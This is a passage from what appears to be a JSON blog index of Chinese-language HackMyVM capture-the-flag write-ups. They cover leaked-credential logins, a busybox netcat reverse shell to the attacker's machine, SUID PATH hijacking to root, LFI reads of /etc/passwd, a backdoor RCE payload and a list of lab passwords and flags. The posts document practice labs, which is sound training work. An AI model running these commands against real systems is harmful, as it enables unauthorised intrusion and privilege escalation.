\u4ee5\u67e5\u8be2\u6240\u6709\u6570\u636e\u3002\n\n**\u4fe1\u606f\u6cc4\u9732:**\n\u6267\u884c\u8be5\u6ce8\u5165\u540e\uff0c\u4ece\u8fd4\u56de\u7684\u6570\u636e\u4e2d\u53d1\u73b0\u4e86\u7528\u6237\u51ed\u636e\uff1a\n\n*   **\u7528\u6237**: `Okabe`\n*   **\u5bc6\u7801**: `OOOkkkaaabbbeee`\n\n## 2. \u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650 (www-data)\n\n\u4f7f\u7528\u6cc4\u9732\u7684\u51ed\u636e `Okabe:OOOkkkaaabbbeee` \u6210\u529f\u767b\u5f55 8080 \u7aef\u53e3\u7684\u540e\u53f0\u3002\u540e\u53f0\u63d0\u4f9b\u4e86\u4e00\u4e2a 'D-Mail \u7ec8\u7aef' \u529f\u80fd\uff0c\u8fd9\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u540e\u95e8\u3002\n\n\u5229\u7528\u8be5\u540e\u95e8\u6267\u884c\u53cd\u5f39 Shell \u547d\u4ee4\uff0c\u5728\u672c\u5730\u76d1\u542c\u5e76\u6210\u529f\u83b7\u53d6\u4e86\u4e00\u4e2a `www-data` \u7528\u6237\u7684 Shell\u3002\n\n**\u672c\u5730\u76d1\u542c (Kali):**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888\n```\n\n**\u89e6\u53d1\u53cd\u5f39 Shell (\u901a\u8fc7\u540e\u53f0\u7ec8\u7aef):**\n\n```bash\nbusybox nc 192.168.205.128 8888 -e /bin/bash\n```\n\n\u6210\u529f\u83b7\u5f97 `www-data` \u6743\u9650\u7684\u4ea4\u4e92\u5f0f Shell\u3002\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u4ece `www-data` \u5230 `kyoma`\n\n\u7a33\u5b9a Shell\n\n```bash\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80\n```\n\n\u5728\u7a33\u5b9a Shell \u540e\uff0c\u68c0\u67e5\u73af\u5883\u53d8\u91cf\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `Pass` \u7684\u53d8\u91cf\u3002\n\n```bash\nwww-data@Mayuri:/$ env\n...\nPass=1.129848\n...\n```\n\n\u540c\u65f6\uff0c\u53d1\u73b0\u7cfb\u7edf\u4e2d\u5b58\u5728\u7528\u6237 `kyoma`\u3002\u62b1\u7740\u5c1d\u8bd5\u7684\u5fc3\u6001\uff0c\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u7801\u5207\u6362\u7528\u6237\u3002\n\n```bash\nwww-data@Mayuri:/$ su kyoma\nPassword: 1.129848\nkyoma@Mayuri:/$ id\nuid=1001(kyoma) gid=1001(kyoma) groups=1001(kyoma)\n```\n\n\u6210\u529f\u5207\u6362\u5230 `kyoma` \u7528\u6237\uff0c\u5e76\u5728\u5176\u5bb6\u76ee\u5f55\u4e0b\u627e\u5230\u7b2c\u4e00\u4e2a flag `user.txt`\u3002\n\n## 2. \u4ece `kyoma` \u5230 `root`\n\n\u5728 `kyoma` \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e0b\uff0c\u53d1\u73b0\u4e00\u4e2a\u5177\u6709 SUID \u6743\u9650\u7684\u53ef\u6267\u884c\u6587\u4ef6 `TimeMachine`\u3002\n\n```bash\nkyoma@Mayuri:~$ ls -al\n...\n-rwsr-xr-x 1 root root  17208 Aug  6 07:35 TimeMachine\n-rw-r--r-- 1 root root     16 Aug  6 08:39 user.txt\n```\n\n\u4f7f\u7528 `strings` \u547d\u4ee4\u5206\u6790\u8be5\u6587\u4ef6\uff0c\u53d1\u73b0\u5b83\u8c03\u7528\u4e86 `system` \u51fd\u6570\uff0c\u5e76\u6267\u884c\u4e86\u5305\u542b `timedatectl` \u7684\u547d\u4ee4\uff0c\u4f46\u6ca1\u6709\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u3002\n\n```bash\nkyoma@Mayuri:~$ strings TimeMachine\n...\nsystem\n...\ntimedateH\nctl | grH\nep 'LocaH\nl time' H\n...\n```\n\n\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684 **PATH \u73af\u5883\u53d8\u91cf\u52ab\u6301**\u6f0f\u6d1e\u3002\u7531\u4e8e `TimeMachine` \u4ee5 `root` \u6743\u9650\u8fd0\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u540c\u540d\u7684\u6076\u610f\u811a\u672c\uff0c\u5e76\u4fee\u6539 `PATH` \u53d8\u91cf\u6765\u52ab\u6301\u547d\u4ee4\u6267\u884c\u6d41\u7a0b\uff0c\u4ece\u800c\u4ee5 `root` \u8eab\u4efd\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\n\n**\u63d0\u6743\u6b65\u9aa4:**\n\n1. **\u521b\u5efa\u6076\u610f\u811a\u672c**: \u5728 `/tmp` \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a `timedatectl` \u7684\u811a\u672c\uff0c\u5185\u5bb9\u4e3a\u7ed9 `/bin/bash` \u6dfb\u52a0 SUID \u6743\u9650\u3002\n\n   ```bash\n   kyoma@Mayuri:~$ echo 'chmod +s /bin/bash' > /tmp/timedatectl\n   ```\n\n2. **\u8d4b\u4e88\u6267\u884c\u6743\u9650**:\n\n   ```bash\n   kyoma@Mayuri:~$ chmod +x /tmp/timedatectl\n   ```\n\n3. **\u52ab\u6301 PATH**: \u5c06 `/tmp` \u76ee\u5f55\u6dfb\u52a0\u5230 `PATH` \u73af\u5883\u53d8\u91cf\u7684\u5f00\u5934\u3002\n\n   ```bash\n   kyoma@Mayuri:~$ export PATH=/tmp:$PATH\n   ```\n\n4. **\u89e6\u53d1\u6f0f\u6d1e**: \u6267\u884c SUID \u7a0b\u5e8f `TimeMachine`\u3002\n\n   ```bash\n   kyoma@Mayuri:~$ ./TimeMachine\n   ```\n\n   \u7a0b\u5e8f\u6267\u884c\u540e\uff0c\u6211\u4eec\u7684\u6076\u610f\u811a\u672c `/tmp/timedatectl` \u4f1a\u88ab\u4ee5 `root` \u6743\u9650\u8c03\u7528\uff0c\u6210\u529f\u4e3a `/bin/bash` \u6dfb\u52a0\u4e86 SUID \u4f4d\u3002\n\n5. **\u83b7\u53d6 Root Shell**: \u4f7f\u7528 `bash -p` \u547d\u4ee4\u542f\u52a8\u4e00\u4e2a\u4fdd\u7559\u6709\u6548\u7528\u6237ID\uff08euid\uff09\u7684 Shell\uff0c\u4ece\u800c\u83b7\u5f97 `root` \u6743\u9650\u3002\n\n   ```bash\n   kyoma@Mayuri:~$ ls -al /bin/bash\n   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash\n   kyoma@Mayuri:~$ bash -p\n   bash-5.0# id\n   uid=1001(kyoma) gid=1001(kyoma) euid=0(root) egid=0(root) groups=0(root),1001(kyoma)\n   ```\n\n# \u56db\u3001\u593a\u53d6\u65d7\u5e1c\n\n\u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u540e\uff0c\u8bfb\u53d6\u6700\u7ec8\u7684\u65d7\u5e1c\u6587\u4ef6\u3002\n\n```bash\nbash-5.0# cat /home/kyoma/user.txt \nflag{1.055821%}\n\nbash-5.0# cat /root/root.txt\nflag{1.123581%}\n```\n\n\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002\u8fd9\u4e00\u5207\u90fd\u662f\u547d\u8fd0\u77f3\u4e4b\u95e8\u7684\u9009\u62e9\u3002sentence", "top": 0, "createdAt": 1754660153, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-08", "dateLabelColor": "#0969da"}, "P197": {"htmlDir": "docs/post/hmv_Labs_venus31to40.html", "labels": ["HackMyVM_Labs"], "postTitle": "hmv_Labs_venus31to40", "postUrl": "post/hmv_Labs_venus31to40.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/197", "commentNum": 0, "wordCount": 4261, "description": "# **Mission 0x31: kira -> veronica**\n\n- **\u4efb\u52a1**: \u7528\u6237 `veronica` \u7ecf\u5e38\u8bbf\u95ee `http://localhost/waiting.php`\u3002\n\n1. \u4f7f\u7528 `curl` \u8bbf\u95ee\u8be5\u9875\u9762\uff0c\u4f1a\u6536\u5230\u4e00\u6761\u4fe1\u606f\uff0c\u63d0\u793a\u670d\u52a1\u5668\u6b63\u5728\u7b49\u5f85\u4e00\u4e2a\u7279\u5b9a\u7684 User-Agent\u3002\n\n   ```bash\n   kira@venus:~$ curl http://localhost/waiting.php\n   Im waiting for the user-agent PARADISE. \n   ```\n\n2. \u6839\u636e\u63d0\u793a\uff0c\u5728 `curl` \u8bf7\u6c42\u4e2d\u901a\u8fc7 `-H` \u53c2\u6570\u8bbe\u7f6e `User-Agent` \u4e3a `PARADISE`\uff0c\u6210\u529f\u83b7\u53d6\u5bc6\u7801\u3002\n\n   ```bash\n   kira@venus:~$ curl -H 'User-Agent: PARADISE' http://localhost/waiting.php\n   QTOel6BodTx2cwX \n   ```\n\n3. **veronica \u7684\u5bc6\u7801**: `QTOel6BodTx2cwX`\n\n# **Mission 0x32: veronica -> lana**\n\n- **\u4efb\u52a1**: \u7528\u6237 `veronica` \u4e3a `lana` \u7684\u5bc6\u7801\u521b\u5efa\u4e86\u4e00\u4e2a\u522b\u540d (alias)\u3002\n\n1. \u5728 `veronica` \u7684\u4f1a\u8bdd\u4e2d\uff0c\u4f7f\u7528 `alias` \u547d\u4ee4\u53ef\u4ee5\u5217\u51fa\u6240\u6709\u5df2\u5b9a\u4e49\u7684\u522b\u540d\u3002\n\n   ```bash\n   veronica@venus:~$ alias\n   alias lanapass='UWbc0zNEVVops1v'\n   alias ls='ls --color=auto'\n   ```\n\n2. \u540d\u4e3a `lanapass` \u7684\u522b\u540d\u76f4\u63a5\u66b4\u9732\u4e86 `lana` \u7684\u5bc6\u7801\u3002\n\n3. **lana \u7684\u5bc6\u7801**: `UWbc0zNEVVops1v`\n\n# **Mission 0x33: lana -> noa**\n\n- **\u4efb\u52a1**: \u7528\u6237 `noa` \u559c\u6b22\u538b\u7f29\u5979\u7684\u4e1c\u897f\u3002\n\n1. \u5728\u5bb6\u76ee\u5f55\u4e2d\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `zip.gz` \u7684\u6587\u4ef6\u3002\u5c3d\u7ba1\u540e\u7f00\u662f `.gz`\uff0c\u4f46\u4f7f\u7528 `file` \u547d\u4ee4\u68c0\u67e5\u53d1\u73b0\u5b83\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a `tar` \u5f52\u6863\u6587\u4ef6\u3002\uff08Labs\u4e0d\u8bb8\u89e3\u538b\u5728\u8be5\u673a\u5668\uff0c\u6240\u4ee5\u9700\u8981\u4f60\u81ea\u5df1\u60f3\u529e\u6cd5\u62c9\u53bb\u672c\u5730\uff0c\u53ef\u4ee5\u4f7f\u7528bsae64\u590d\u5236\u62c9\u53d6\uff09\n\n2. \u5c06\u5176\u89e3\u538b\u540e\uff0c\u4f1a\u5f97\u5230\u4e00\u4e2a\u540d\u4e3a `zip` \u7684\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u5bc6\u7801\u3002\n\n   ```bash\n   # \u5728\u672c\u5730\u673a\u5668\u4e0a\u64cd\u4f5c\n   $ file zip.gz\n   zip.gz: POSIX tar archive (GNU)\n   $ tar -xvf zip.gz\n   pwned/lana/zip\n   $ cat pwned/lana/zip \n   9WWOPoeJrq6ncvJ\n   ```\n\n3. **noa \u7684\u5bc6\u7801**: `9WWOPoeJrq6ncvJ`\n\n# **Mission 0x34: noa -> maia**\n\n- **\u4efb\u52a1**: `maia` \u7684\u5bc6\u7801\u88ab\u201c\u5783\u573e\u201d\u5305\u56f4\u7740\u3002\n\n1. \u5728\u5bb6\u76ee\u5f55\u4e2d\u6709\u4e00\u4e2a\u540d\u4e3a `trash` \u7684\u6587\u4ef6\uff0c\u91cc\u9762\u5145\u6ee1\u4e86\u968f\u673a\u7684\u201c\u5783\u573e\u201d\u6570\u636e\u3002\n\n2. \u4f7f\u7528 `strings` \u547d\u4ee4\u53ef\u4ee5\u4ece\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u63d0\u53d6\u53ef\u6253\u5370\u7684\u5b57\u7b26\u4e32\uff0c\u4ece\u800c\u5728\u5783\u573e\u6570\u636e\u4e2d\u627e\u5230\u771f\u6b63\u7684\u5bc6\u7801\u3002\n\n   ```bash\n   noa@venus:~$ strings trash\n   ...\n   \\nh1hnDPHpydEjoEN\n   ...\n   ```\n\n3. **maia \u7684\u5bc6\u7801**: `h1hnDPHpydEjoEN`\n\n# **Mission 0x35: maia -> gloria**\n\n- **\u4efb\u52a1**: `gloria` \u5fd8\u8bb0\u4e86\u5979\u5bc6\u7801\u7684\u6700\u540e\u4e24\u4e2a\u5b57\u7b26\uff0c\u53ea\u8bb0\u5f97\u662f\u4e24\u4e2a\u5c0f\u5199\u5b57\u6bcd\u3002\n\n1. \u540d\u4e3a `forget` \u7684\u6587\u4ef6\u7ed9\u51fa\u4e86\u5bc6\u7801\u7684\u5df2\u77e5\u90e8\u5206\uff1a`v7xUVE2e5bjUc??`\u3002\n\n2. \u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684\u66b4\u529b\u7834\u89e3\u573a\u666f\u3002\u53ef\u4ee5\u7f16\u5199\u4e00\u4e2a\u811a\u672c\u751f\u6210\u6240\u6709\u53ef\u80fd\u7684\u5c0f\u5199\u5b57\u6bcd\u7ec4\u5408\uff08\u4ece `aa` \u5230 `zz`\uff09\uff0c\u7136\u540e\u4f7f\u7528 `hydra` \u7b49\u5de5\u5177\u5bf9 `gloria` \u7684 SSH \u670d\u52a1\u8fdb\u884c\u5bc6\u7801\u7206\u7834\u3002\n\n   ```bash\n   for a in {a..z}; do for b in {a..z}; do echo 'v7xUVE2e5bjUc${a}${b}'; done; done |tac > pass\n   ```\n\n3. \u6700\u7ec8\u627e\u5230\u7684\u6b63\u786e\u5bc6\u7801\u662f `v7xUVE2e5bjUcxw`\u3002\n\n# **Mission 0x36: gloria -> alora**\n\n- **\u4efb\u52a1**: `alora` \u559c\u6b22\u753b\u753b\uff0c\u6240\u4ee5\u5979\u628a\u5bc6\u7801\u5b58\u6210\u4e86\u4e00\u5e45\u201c\u753b\u201d\u3002\n\n1.  \u5bb6\u76ee\u5f55\u4e0b\u7684 `image` \u6587\u4ef6\u5185\u5bb9\u662f\u4e00\u5927\u7247\u7531 `#` \u5b57\u7b26\u7ec4\u6210\u7684 ASCII \u827a\u672f\u3002\n2.  \u8fd9\u5e45\u201c\u753b\u201d\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801 (QR Code)\u3002\u4f7f\u7528\u624b\u673a\u6216\u5728\u7ebf\u4e8c\u7ef4\u7801\u626b\u63cf\u5de5\u5177\u626b\u63cf\u5373\u53ef\u5f97\u5230\u5bc6\u7801\u3002\n3.  **alora \u7684\u5bc6\u7801**: `mhrTFCoxGoqUxtw`\n\n# **Mission 0x37: alora -> julie**\n\n- **\u4efb\u52a1**: \u7528\u6237 `julie` \u521b\u5efa\u4e86\u4e00\u4e2a\u5305\u542b\u5979\u5bc6\u7801\u7684 ISO \u6587\u4ef6\u3002\n\n1. \u5728\u5bb6\u76ee\u5f55\u4e2d\u627e\u5230 `music.iso` \u6587\u4ef6\u3002\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 `strings` \u547d\u4ee4\u5728\u6587\u4ef6\u4e2d\u67e5\u627e\u53ef\u7591\u7684\u5bc6\u7801\u5b57\u7b26\u4e32\u3002\n\n   ```bash\n   alora@venus:~$ strings music.iso\n   ...\n   sjDf4i2MSNgSvOv\n   ...\n   ```\n\n2. **julie \u7684\u5bc6\u7801**: `sjDf4i2MSNgSvOv`\n\n# **Mission 0x38: julie -> irene**\n\n- **\u4efb\u52a1**: `irene` \u76f8\u4fe1\u201c\u7f8e\u5728\u4e8e\u4e0d\u540c\u201d\u3002\n\n1. \u5bb6\u76ee\u5f55\u4e0b\u6709\u4e24\u4e2a\u6587\u4ef6\uff1a`1.txt` \u548c `2.txt`\u3002\u8fd9\u4e2a\u63d0\u793a\u6697\u793a\u9700\u8981\u627e\u51fa\u5b83\u4eec\u4e4b\u95f4\u7684\u5dee\u5f02\u3002\n\n2. \u4f7f\u7528 `diff` \u547d\u4ee4\u6bd4\u8f83\u8fd9\u4e24\u4e2a\u6587\u4ef6\u3002\n\n   ```bash\n   julie@venus:~$ diff 1.txt 2.txt\n   174c174\n   < 8VeRLEFkBpe2DSD\n   ---\n   > aNHRdohjOiNizlU\n   ```\n\n3. \u5dee\u5f02\u4e4b\u5904\u663e\u793a\u4e86\u4e24\u884c\u4e0d\u540c\u7684\u5b57\u7b26\u4e32\uff0c\u5176\u4e2d\u4e00\u4e2a\u662f\u5bc6\u7801\u3002\u7ecf\u8fc7\u5c1d\u8bd5\uff0c`8VeRLEFkBpe2DSD` \u662f\u6b63\u786e\u7684\u5bc6\u7801\u3002\n\n4. **irene \u7684\u5bc6\u7801**: `8VeRLEFkBpe2DSD`\n\n# **Mission 0x39: irene -> adela**\n\n- **\u4efb\u52a1**: `adela` \u628a\u5979\u7684\u5bc6\u7801\u501f\u7ed9\u4e86 `irene`\u3002\n\n1. `irene` \u7684\u5bb6\u76ee\u5f55\u4e0b\u6709\u4e00\u4e2a\u52a0\u5bc6\u6587\u4ef6 `pass.enc` \u548c\u4e00\u4e2a\u79c1\u94a5\u6587\u4ef6 `id_rsa.pem`\u3002\n\n2. \u8fd9\u8868\u660e\u5bc6\u7801\u662f\u4f7f\u7528 RSA \u52a0\u5bc6\u7684\u3002\u4f7f\u7528 `openssl` \u548c\u7ed9\u5b9a\u7684\u79c1\u94a5\u53ef\u4ee5\u89e3\u5bc6\u6587\u4ef6\u5185\u5bb9\u3002\n\n   ```bash\n   irene@venus:~$ openssl rsautl -decrypt -inkey id_rsa.pem -in pass.enc\n   nbhlQyKuaXGojHx\n   ```\n\n3. **adela \u7684\u5bc6\u7801**: `nbhlQyKuaXGojHx`\n\n# **Mission 0x40: adela -> sky**\n\n- **\u4efb\u52a1**: `sky` \u628a\u5979\u7684\u5bc6\u7801\u4fdd\u5b58\u5728\u53ef\u4ee5\u201c\u542c\u5230\u201d\u7684\u4e1c\u897f\u91cc\u3002\n\n1. `adela` \u76ee\u5f55\u4e0b\u6709\u4e00\u4e2a\u540d\u4e3a `wtf` \u7684\u6587\u4ef6\uff0c\u5185\u5bb9\u662f\u4e00\u4e32\u70b9\u548c\u5212\u3002\n\n   ```bash\n   adela@venus:~$ cat wtf\n   .--. .- .--. .- .--. .- .-. .- -.. .. ... .\n   ```\n\n2. \u8fd9\u660e\u663e\u662f\u6469\u65af\u5bc6\u7801\u3002\u4f7f\u7528\u5728\u7ebf\u5de5\u5177\u8fdb\u884c\u7ffb\u8bd1\uff0c\u5f97\u5230 `PAPAPARADISE`\u3002\n\n3. \u5c1d\u8bd5\u4f7f\u7528\u8be5\u5bc6\u7801\u767b\u5f55\u5931\u8d25\uff0c\u4f46\u5c06\u5176\u8f6c\u6362\u4e3a\u5c0f\u5199 `papaparadise` \u540e\u6210\u529f\u767b\u5f55\u3002\n\n4. **sky \u7684\u5bc6\u7801**: `papaparadise`\n\n***\n\n# **Flag**\n\n```\n31. veronica:      8===iSSeKzoDXsKy8WPuqNPg===D~~\n32. lana:          8===um3Hno2AsjFjuLWsfmDj===D~~\n33. noa:           8===HUNGevKdeKwcCvJru1CC===D~~\n34. maia:          8===nu8IDScKFAXVcnFutKtG===D~~\n35. gloria:        8===RZIkEtaEp18tLslTopJj===D~~\n36. alora:         8===NSe78N2lM7IbvHzvrC0G===D~~\n37. julie:         8===Iwe1QpxTcx0A8Uusqjfe===D~~\n38. irene:         8===c9hgLkLGzsNw7mB3VEr4===D~~\n39. adela:         8===86XGXQefUeV2eEdrUzxx===D~~\n40. sky:           8===8T2IE4fNIvbs8sh1lnew===D~~\n\nHidden Flags:\n40.sky:            8===nyqRAOwkVRTiMYeePdes===D~~\n```\n\n# **Pass**\n\n```\n31: veronica/QTOel6BodTx2cwX\n32: lana/UWbc0zNEVVops1v\n33: noa/9WWOPoeJrq6ncvJ\n34: maia/h1hnDPHpydEjoEN\n35: gloria/v7xUVE2e5bjUcxw\n36: alora/mhrTFCoxGoqUxtw\n37: julie/sjDf4i2MSNgSvOv\n38: irene/8VeRLEFkBpe2DSD\n39: adela/nbhlQyKuaXGojHx\n40: sky/papaparadise\n```\n\nsentence", "top": 0, "createdAt": 1754665071, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-08", "dateLabelColor": "#0969da"}, "P198": {"htmlDir": "docs/post/nei-bu-_Pycrt.html", "labels": ["HackMyVM"], "postTitle": "\u5185\u90e8_Pycrt", "postUrl": "post/nei-bu-_Pycrt.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/198", "commentNum": 0, "wordCount": 5833, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf**\n\n\u9996\u5148\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\uff0c\u968f\u540e\u5229\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.131 08:00:27:75:0e:4e       PCS Systemtechnik GmbH\n...\n```\n\n**\u7aef\u53e3\u626b\u63cf:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.131\n...\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n6667/tcp open  irc\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.131`\uff0c\u5f00\u653e\u4e86 **22 (SSH)**\u3001**80 (HTTP)** \u548c **6667 (IRC)** \u7aef\u53e3\u3002\n\n## **2. \u670d\u52a1\u4fa6\u5bdf**\n\n* **HTTP (80\u7aef\u53e3):** \u8bbf\u95ee\u8be5\u7aef\u53e3\u53d1\u73b0\u662f Apache2 \u7684\u9ed8\u8ba4\u6b22\u8fce\u9875\u9762\uff0c\u6ca1\u6709\u76f4\u63a5\u53ef\u5229\u7528\u7684\u4fe1\u606f\u3002\n\n* **IRC (6667\u7aef\u53e3):** \u8fd9\u662f\u5173\u952e\u7684\u7a81\u7834\u53e3\u3002\u4f7f\u7528 `irssi` \u5ba2\u6237\u7aef\u8fde\u63a5\u5230\u8be5\u670d\u52a1\u3002\n\n  ```bash\n  irssi -c 192.168.205.131 -p 6667\n  ```\n\n  \u5728\u8fde\u63a5\u540e\u7684\u670d\u52a1\u5668\u6b22\u8fce\u4fe1\u606f (MOTD) \u4e2d\uff0c\u53d1\u73b0\u4e00\u6761\u81f3\u5173\u91cd\u8981\u7684\u7ebf\u7d22\uff1a\n\n  > `...issues ShadowSec directory...`\n  > \u8fd9\u5f3a\u70c8\u6697\u793aWeb\u670d\u52a1\u4e0a\u53ef\u80fd\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a `ShadowSec` \u7684\u76ee\u5f55\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u521d\u59cb\u8bbf\u95ee**\n\n## **1. Web\u76ee\u5f55\u4e0e\u4ee3\u7801\u5ba1\u8ba1**\n\n\u6839\u636e IRC \u670d\u52a1\u63d0\u4f9b\u7684\u7ebf\u7d22\uff0c\u8bbf\u95ee `http://192.168.205.131/ShadowSec/`\uff0c\u53d1\u73b0\u4e00\u4e2a\u9759\u6001\u9875\u9762\u3002\u5bf9\u8be5\u76ee\u5f55\u8fdb\u884c\u6df1\u5ea6\u626b\u63cf\uff0c\u53d1\u73b0\u4e00\u4e2a\u9690\u85cf\u7684\u6587\u4ef6 `bydataset.php`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 \n...\n/bydataset.php        (Status: 200)\n...\n```\n\n# **2. LFI \u5230 RCE**\n\n\u901a\u8fc7\u5bf9 `bydataset.php` \u8fdb\u884c\u53c2\u6570\u6a21\u7cca\u6d4b\u8bd5\uff0c\u53d1\u73b0\u4e00\u4e2a `file` \u53c2\u6570\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b (LFI) \u6f0f\u6d1e\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 \n...\nfile                    [Status: 200, Size: 1452, Words: 13, Lines: 28, Duration: 14ms]\n...\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=/etc/passwd'\nroot:x:0:0:root:/root:/bin/bash\n...\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n...\n```\n\n\u5229\u7528\u8be5LFI\u6f0f\u6d1e\uff0c\u8bfb\u53d6 `bydataset.php` \u6587\u4ef6\u81ea\u8eab\u7684\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u5176\u5305\u542b\u4e00\u4e2a\u540e\u95e8\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=bydataset.php'\n```\n\n\u6e90\u7801\u5ba1\u8ba1\u7ed3\u679c\u5982\u4e0b\uff1a\n\n*   \u5f53\u63a5\u6536\u5230 **POST** \u8bf7\u6c42\u65f6\u3002\n*   \u9700\u8981\u4e00\u4e2a `auth` \u53c2\u6570\uff0c\u5176\u503c\u5fc5\u987b\u4e3a\u786c\u7f16\u7801\u7684 `'LetMeIn123!'`\u3002\n*   \u63a5\u6536\u4e00\u4e2a `payload` \u53c2\u6570\uff0c\u8be5\u53c2\u6570\u7ecf\u8fc7 `strrev()` (\u5b57\u7b26\u4e32\u53cd\u8f6c) \u548c `base64_decode()` \u89e3\u7801\u540e\uff0c\u5982\u679c\u4ee5 `cmd:` \u5f00\u5934\uff0c\u5219\u5176\u540e\u7684\u5185\u5bb9\u4f1a\u88ab `exec()` \u51fd\u6570\u6267\u884c\u3002\n\n\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684\u3001\u7cbe\u5fc3\u6784\u9020\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c (RCE) \u6f0f\u6d1e\u3002\n\n## **3. \u83b7\u53d6 www-data Shell**\n\n\u6839\u636e\u6e90\u7801\u903b\u8f91\uff0c\u6784\u9020\u6211\u4eec\u7684Payload\u3002\n\n1.  **\u76ee\u6807\u547d\u4ee4:** `id`\n2.  **\u6784\u9020\u5b57\u7b26\u4e32:** `cmd:id`\n3.  **Base64\u7f16\u7801:** `Y21kOmlk`\n4.  **\u5b57\u7b26\u4e32\u53cd\u8f6c:** `klimDk12Y`\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]\n\u2514\u2500$ echo -n 'cmd:id' | base64 -w0 | rev  \nklmOk12Y \n```\n\n\u4f7f\u7528 `curl` \u53d1\u9001\u6784\u9020\u597d\u7684POST\u8bf7\u6c42\uff0c\u6210\u529f\u9a8c\u8bc1RCE\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -X POST --data 'auth=LetMeIn123!' --data-urlencode 'payload=klmOk12Y' http://192.168.205.131/ShadowSec/bydataset.php\n<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>\n```\n\n\u63a5\u4e0b\u6765\uff0c\u6784\u9020\u53cd\u5f39Shell\u7684Payload\uff0c\u5728\u672c\u5730Kali\u5f00\u542f\u76d1\u542c\u540e\uff0c\u6210\u529f\u83b7\u53d6 `www-data` \u7528\u6237\u7684\u4ea4\u4e92\u5f0fShell\u3002\n\n**\u672c\u5730\u76d1\u542c:**\n\n```bash\nnc -lvnp 